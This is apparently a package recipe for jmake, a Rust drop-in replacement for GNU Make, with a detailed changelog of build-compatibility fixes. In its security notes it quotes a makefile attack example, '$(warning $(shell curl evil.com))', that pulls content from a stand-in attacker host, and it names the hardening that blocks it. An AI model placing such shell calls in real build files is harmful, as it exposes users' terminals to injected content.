[package]
name = "jmake"
version = "1.2.6"
license = "MIT"
description = "Clean-room drop-in replacement for GNU Make, written in Rust"
# 1.2.6: turn 1.2.5's two queued cosmetic stderr issues into real fixes.
#
# Bug A (Valkey @printf leak in -include rebuild): jmake had two
# separate prefix scanners for recipe-line modifiers (@/-/+). The main
# execute_recipe path correctly re-scanned the post-expansion text, so
# `\t-$(SERVER_CC) -MM ...` where $(SERVER_CC) starts with @printf
# stripped both - and @ before shelling out. But the
# expand_include_recipe_lines path (used to rebuild Makefile.dep and
# other -include'd auto-generated files) only scanned the raw template
# before expansion, so the @ introduced by $(QUIET_CC)$(CC) leaked
# through to /bin/sh as @printf and the recipe was also displayed
# verbatim instead of being silenced. Added the second strip pass to
# match the main path. src/eval/mod.rs ~line 3878.
#
# Bug B (Valkey FINAL_LIBS literal-text leak): the VariableAssignment
# dispatch had two paths: pre-expansion path correctly expanded
# := / ::= RHS at definition time, but the tab-prefixed shortcut path
# (taken by `\tFINAL_LIBS := ...` inside an active ifeq block) fell
# through to set_variable() with the unexpanded value. Valkey's
# USE_JEMALLOC branch contains
# `\\tFINAL_LIBS := ../jemalloc.a $(FINAL_LIBS)` — the literal
# $(FINAL_LIBS) text was being stored, then the LINK recipe expanded
# $(FINAL_LIBS) and the shell saw `$(FINAL_LIBS)` (subshell) and
# tried to exec FINAL_LIBS as a command. Fix: expand RHS for Simple /
# PosixSimple flavor before set_variable in the shortcut dispatch.
# src/eval/mod.rs ~line 2222.
#
# Both reproduced in clean-room and verified end-to-end on Pi 5
# (tormenta) — Valkey 9.0.4 builds with ZERO stderr noise after this
# release.
#
# Tests: 17 unit + 251 feature pass (added 4 regression tests across
# both fixes). 0 warnings.
#
# 1.2.5: Valkey/jemalloc unblock + perf + security + safety audit.
#
# Static pattern rule recipe-loss (Valkey/jemalloc blocker): GNU Make
# allows declaring a static pattern rule's prerequisite-pattern in one
# statement and its recipe in another — jemalloc's Makefile does this
# (`$(C_JET_OBJS): $(objroot)src/%.jet.$(O): $(srcroot)src/%.c` then
# later `$(C_JET_OBJS): %.$(O):\n\trecipe`). 1.2.4 lost the prereq when
# they were split, leaving `$<` empty and producing `cc: error: no input
# files` on every .jet.o build. Fix: when a target doesn't match the
# target-pattern, emit it as an empty-prereq rule (preserving the
# recipe binding) with a warning, instead of silently dropping it.
# End-to-end validated 2026-05-11: jemalloc 5.3.0 + Valkey 9.0.4 build
# clean on a Raspberry Pi 5 and the server starts + PING/SET/GET works.
#
# Tab-indented variable assignment inside ifeq: ifeq/else/endif left
# the parser in `in_recipe=true` state if a rule had been opened, so
# `\tFINAL_LIBS += -ldl` inside a conditional block got queued as a
# recipe line of the preceding rule. Fix in src/parser/mod.rs: detect
# Make-op assignments (+=, :=, ::=, :::=, ?=, !=) on tab-indented
# lines and classify them as variable assignments regardless of
# in_recipe. Plain `=` is intentionally excluded to preserve correct
# parsing of .ONESHELL recipes containing `@X=val` and env-prefix
# commands like `VAR=val cmd`.
#
# Built-in function perf (4.5–6× across 11 functions): replaced
# `Vec<String>` + `.join(" ")` with direct String accumulation in
# addsuffix, addprefix, join, patsubst, filter, filter-out, strip,
# dir, notdir, suffix, basename, realpath, abspath, sort, and the
# substitution-reference expander. $(foreach) reuses its auto_vars
# HashMap across iterations instead of cloning per word. BUILTIN_VARS
# linear scan replaced with OnceLock<HashSet> for O(1) lookup.
# find_pattern_rule_inner no longer allocates a Vec<&Rule> per
# uncached call.
#
# Security hardening: 256 MiB cap on expanded-value size (HIGH —
# defeats S_n := $(S_{n-1})$(S_{n-1}) assignment-doubling and
# $(foreach) explosion DoS). ANSI escape sanitization for $(info) /
# $(warning) / $(error) output when stdout is a TTY (MEDIUM —
# prevents terminal hijack via $(warning $(shell curl evil.com))).
# Pass-through when piped so CI logs unaffected.
#
# Safety audit: all 11 unsafe sites (9 unsafe blocks + 2 unsafe impl
# Sync/Send) re-documented with canonical per-bullet SAFETY blocks.
# Setup-time bounds checks (set_temp_stdin_path, set_term_message)
# promoted from debug_assert! to assert! so release builds can't drop
# the guard. Two $(eval) raw pointer casts flagged with a Kani
# harness opportunity and a "needs RefCell<MakeDatabase>" TODO gated
# for 1.3.0. See UNSAFE_AUDIT.md in the repo.
#
# Compat: 132 passing tests adopted from the GNU Make 4.4.1 upstream
# test suite as ongoing regression coverage; 308 known failures
# triaged into 9 categories live in tests/upstream_441_GAPS.md.
# Top backlog: MAKEFLAGS letter-flag propagation in recursive make
# (96), chained implicit rule search (60+).
#
# Known cosmetic issues (queued for 1.2.6) — these produce stderr
# noise but do NOT prevent successful builds. Verified on real
# Valkey: build completes, binaries link, server runs:
#   - Valkey's specific QUIET_CC pattern (where $(CC) is wrapped by
#     a $(QUIET_CC) variable that begins with @printf and includes
#     color escape sequences) leaks the @ through some code path
#     that's not reproducible with simpler 3-line reproducers.
#   - Valkey's deep ifeq nesting (FINAL_LIBS+= inside ifeq-inside-
#     ifeq with mixed tab/space indentation) leaks the FINAL_LIBS+=
#     text as a shell command after the link step. Same: build
#     succeeds despite the stderr.
#
# 1.2.3: multi-word SHELL re-tokenization bug — when SHELL contained
# whitespace (e.g. `SHELL = /bin/sh -e`, which Python's ./configure
# writes by default), jmake 1.2.2 composed the invocation as a single
# shell string and ran it through `/bin/sh -c`. The outer shell then
# re-tokenized the string, destroying the recipe-string boundary:
#   exec'd:    /bin/sh -c "/bin/sh -e -c cc -c -o out.o in.c"
#   inner saw: argv = ["sh","-e","-c","cc","-c","-o","out.o","in.c"]
#                                       ^^command_string = "cc"
#                                       ^^^^^^^^^^^^^^^^^^^ $0..$N
#   final exec: cc with argv=["cc"]  ->  "no input files"
# Same root cause produced "/bin/sh: syntax error near unexpected
# token 'then'" for `@if test ... ; then ... fi` recipes.
#
# Repro: cpython 3.15 main on jonerix tormenta 2026-05-10 — Python's
# ./configure wrote `SHELL=/bin/sh -e` to Makefile and every recipe
# after the program name lost its arguments. Workaround used
# `SHELL=/bin/sh` on the command line; this release removes that need.
#
# Fix: tokenize SHELL ourselves at unquoted whitespace into
# (program, args) and exec [program, ...extra, ...shellflags, recipe]
# directly. The recipe is always the single final argv element,
# mirroring GNU Make. Applied to both the sequential exec path
# (src/exec/mod.rs) and the parallel worker path (src/exec/parallel.rs).
# Seven new regression tests cover positional-args, if/then/fi,
# multi-flag SHELL, plain (no-flag) baseline, parallel scheduler,
# and ONESHELL. 130 tests pass.
#
# 1.2.2: multi-rule prereq-merge bug — the recipe-bearing rule's
# prereqs must come FIRST in the merged list (then prereq-only rules
# in textual order). 1.2.0 originally added this, then a "bug-fix"
# inverted the policy thinking the original was wrong; verified
# against GNU Make 4.4.1 + BSD make that recipe-first is correct.
#
# Repro: cpython 3.15 main on tormenta 2026-05-10. Python/ceval.o has
#   Python/ceval.o: ceval_macros.h condvar.h ...     # rule 1
#   Python/ceval.o: Python/ceval.c                   # rule 2 (recipe)
#       $(CC) -c $(CFLAGS) -o $@ $<
# 1.2.1 emitted `clang -c -o Python/ceval.o Python/ceval_macros.h`
# (header instead of .c) and clang errored "use of undeclared
# identifier 'PyThreadState'" 16x. 1.2.2 emits the .c file. Three
# regression tests added: prereq merge, three-way merge, cpython
# ceval.o shape. 124 tests pass on x86_64 + aarch64.
#
# 1.2.1: fix 2-char variables ending in D/F (LD, XF, AD, ...) silently
# emptied by auto-var modifier path. Tightened D/F check to allowlist
# the 8 automatic variable characters only.
#
# 1.2.0: hardened release — 122 tests, 9 unsafe blocks quarantined with
# debug_asserts + 4-invariant SAFETY docs, invariant ledger for all modules,
# newtypes (JobCount, RecursionDepth), panic audit (all 19 unwraps proven
# infallible), security audit (expansion depth limit 1000, MAKEFLAGS -j
# overflow), perf (OnceLock builtins, mtime cache, inline hot paths),
# bugs fixed (prereq merge order, UTF-8 double-encoding, $(value) stub,
# wildcard abs-path). 60 new compat tests + 26 edge-case regression tests.
#
# 1.1.14: escape spaces/backslashes/dollars in MAKEFLAGS variable values so
# unescaped whitespace inside `CFLAGS=-Wall -Wmissing-prototypes -O2` (zsh's
# Src/Makefile MAKEDEFS) doesn't leak `-O2` and the chars of
# `-Wmissing-prototypes` back through the bundled-flag parser as
# -i/-s/-n/-t/-r at the next recursive make. Without this, zsh's `make[2] -f
# Makemod headers` silently inherited dry_run=true touch=true and never
# created Src/modules.stamp, which then caused `bltinmods.list` to fail at
# the next recursive level with "No rule to make target 'modules.stamp'".
# Defense-in-depth companion: parse_makeflags now never re-interprets a
# post-`--` token as a flag, even if it leaked in unescaped from a
# non-conforming peer make.
#
# 1.1.9: conformance test suite + JMAKE_TEST_MODE byte-equivalence.
# Adds a Tier-1 real-world driver (musl, expat, libffi, dropbear, toybox)
# that runs `jmake -n` and `/usr/bin/make -n` against each upstream
# tarball and diffs. Adds a Tier-2 feature suite (15 .mk fixtures with
# golden GNU Make 4.4.1 outputs) covering target-/pattern-specific
# variables, patsubst chains, wildcard variants, $(eval)+$(foreach),
# order-only prereqs, double-colon, .PHONY/.SUFFIXES, -r/-k/-n,
# include / -include / sinclude, TAB-VAR-in-conditional, and bare-`:`
# rules under conditionals. JMAKE_TEST_MODE=1 routes ALL customer-
# visible output (--version, error prefix, MAKE/MAKE_COMMAND,
# Entering/Leaving directory, recipe error format, "is up to date"
# / "Nothing to be done") through the GNU make 4.4.1 byte format —
# without the env var, jmake remains honest about being jmake.
#
# 1.1.8: preserve `./` leader when dir_prefix contains a glob. Companion
# to 1.1.7 — the v1.1.7 fix correctly stopped the bogus dir_prefix
# re-prepend for `./src/*/*.c` patterns, but it ALSO stopped the `./`
# leader from being put back when glob stripped it. GNU make returns
# `./foo/bar.c` (with leader) so $(patsubst $(srcdir)/%,%.o,...)
# matches via `srcdir=.`. Without the leader, patsubst doesn't match
# and produces bare stems. musl's AOBJS came out as bare names like
# `obj/src/aio/aio` (no `.o`), which then mis-fired the built-in
# `%: %.o` link rule AND made `ar rc lib/libc.a` see bare names.
# Reproduced + bisected 2026-04-25 against the full musl 1.2.6 source.
#
# 1.1.7: skip the wildcard re-prepend when dir_prefix is itself a glob.
# musl's Makefile builds globs out of glob patterns:
#     SRC_DIRS = $(addprefix $(srcdir)/, src/* src/malloc/$(MALLOC_DIR) ...)
#     BASE_GLOBS = $(addsuffix /*.c, $(SRC_DIRS))
#     BASE_SRCS = $(sort $(wildcard $(BASE_GLOBS)))
# so $(wildcard ...) sees patterns like `./src/*/*.c`. The Rust glob crate
# correctly returns `./src/aio/aio.c`, but jmake's "if glob dropped the
# directory prefix, put it back" logic computed dir_prefix = `./src/*/`
# (literal asterisk) and re-prepended it, producing the bogus
# `./src/*/src/aio/aio.c`. The path then survived patsubst+addprefix all
# the way to `obj/src/*/src/aio/aio.lo`, which crashed `llvm-ar` at the
# final libc.a step. Reproduced 2026-04-25 from a clean musl 1.2.6 build.
# Fix: only re-prepend when dir_prefix has no `*`, `?`, or `[`.
#
# 1.1.6: paren-aware colon search in target-specific variable parsing.
# Lines like
#   $(NOSSP_OBJS) $(NOSSP_OBJS:%.o=%.lo): CFLAGS_ALL += $(CFLAGS_NOSSP)
# (musl Makefile vintage) have a literal `:` inside the $(VAR:pat=sub)
# pattern-substitution reference. The previous TSV split used
# `name.find(':')` which is NOT paren-aware, hit the inner colon, and
# fell through to try_parse_rule — registering CFLAGS_ALL as a real
# prerequisite of every NOSSP_OBJS target (CRT_OBJS includes
# obj/crt/Scrt1.o), so `jmake obj/crt/Scrt1.o` would die with
# `No rule to make target 'CFLAGS_ALL'`. Switching to find_rule_colon
# (which honours $()/${} nesting depth) makes the TSV split align with
# the actual rule colon GNU make sees, and musl's whole bootstrap goes
# green again.
#
# 1.1.5: three compatibility fixes needed by the package repo audit:
#   - gate GNU Make `--version` impersonation behind JMAKE_TEST_MODE=1,
#     otherwise identify as jmake.
#   - keep bare `:` rules so Ruby 3.4's generated yjit.mk does not trip
#     "missing separator" when YJIT is disabled.
#   - make implicit-rule selection prefer the first satisfiable shortest-
#     stem candidate while avoiding recursive self-selection loops
#     (reproduced on strace's generated headers).
#
# 1.1.4: fix $(wildcard) preserving a leading "./" without duplicating
# the directory prefix. Rust's glob crate drops only the leading "./",
# but jmake 1.1.3 re-prepended the full pattern prefix and turned
# "./src/*.h" into "./src/src/*.h". Reproduced building dropbear-2024.86
# and revalidated against the full GNU Make 4.4.1 suite (1340/1340).
#
# 1.1.3: fix TAB-indented variable assignments inside conditional blocks.
# Some upstream makefiles indent `VAR=...` under ifeq/ifndef with a TAB.
# GNU Make still treats those lines as assignments outside a recipe, but
# jmake 1.1.2 mis-classified them as recipe text unless a real recipe was
# already active. That let dropbear's build/install phases collapse to
# "Nothing to be done", producing empty .jpkg payloads.
#
# 1.1.2: fix two remaining GNU Make 4.4.1 suite regressions and make the
# Forgejo CI fail hard on any upstream test-suite miss:
#   - parallel multi-target pattern rules now propagate completion through
#     also-make siblings, so dependents waiting on implicit peer outputs
#     (SV 54233 / SV 60435) unblock in the correct order under -j.
#   - path-alias lookups only normalize explicit path-like rule names, so
#     bare targets like `all` no longer collide with same-named cwd entries
#     during VPATH resolution.
#
# 1.1.1: fix $(wildcard) re-prepending a doubled directory prefix
# when the glob crate strips the leading `./`. Pattern `./src/*.h`
# was coming back from glob as `src/agentfwd.h` and fn_wildcard
# unconditionally re-prepended the full `./src/` → `./src/src/
# agentfwd.h`. Reproduced building dropbear-2024.86 whose
# Makefile expands `$(wildcard $(srcdir)/*.h *.h)` with srcdir=./
# src and every resulting HEADERS entry came out doubled. Fix
# re-prepends only the portion glob actually dropped.
#
# 1.1.0: GNU Make 4.4.1 upstream test suite clean (1369/1369) on
# gentoo castle (bash). Four fixes landed vs 1.0.14:
#   - Accept TAB after directive keywords (include / -include /
#     sinclude) — dhcpcd's src/Makefile:12 and any BSD-convention
#     makefile. Previously errored with "missing separator".
#   - Split short-option clusters containing -c (e.g. -ec) into
#     separate argv tokens. POSIX toybox sh rejects `-ec` as a
#     combined option; permissive shells accept either form.
#   - Expand .SHELLFLAGS / SHELL before tokenizing. Raw
#     `.value.clone()` skipped Make variable expansion so `$$`
#     escapes survived into the child process (broke perl-as-SHELL
#     in targets/ONESHELL subtest 10).
#   - Narrow the bare-name exit-127 "Permission denied" path to
#     is_dir() specifically — `exists()` mis-fired on regular
#     files in cwd that weren't on PATH.
#
# 1.0.14: fix parallel-scheduler deadlock that hung the builder
# forever when a CC fails with -j>1 and -k is not set.

[source]
# Canonical source is the Forgejo repo jonerik/jmake on
# castle.great-morpho.ts.net:3000. That host is Tailscale-only, so
# builders should consume the cached tarball in /workspace/sources/
# via JPKG_SOURCE_CACHE instead of reaching for the network.
#
# Forgejo URL is Tailscale-only, so we point at a GitHub-hosted source
# mirror that CI can reach without VPN. The mirror tarball is generated
# from the same v1.1.6 tag at castle.great-morpho.ts.net:3000.
url = "https://github.com/stormj-UH/jonerix/releases/download/source-jmake-v1.2.6/jmake-v1.2.6.tar.gz"
sha256 = "684157f222eeee3a3e7fed13d43d1b297b295a577be2ff81b3be7c1feea3bfce"

[build]
system = "custom"
# Rust 1.94.1-r2 uses llvm-libunwind=system, so library/unwind emits
# -lunwind instead of -lgcc_s. No cc-wrapper or gnu-compat dep needed.
# The source tarball in sources/ is repacked with Cargo.lock, vendor/,
# and .cargo/config.toml, so the package build is fully offline.
build = """cargo build --release --frozen --offline"""
install = """install -Dm755 target/release/jmake "$DESTDIR/bin/jmake"
ln -sf jmake "$DESTDIR/bin/make"
llvm-strip --strip-all "$DESTDIR/bin/jmake" 2>/dev/null || true"""

[depends]
runtime = ["musl"]
build = ["rust"]
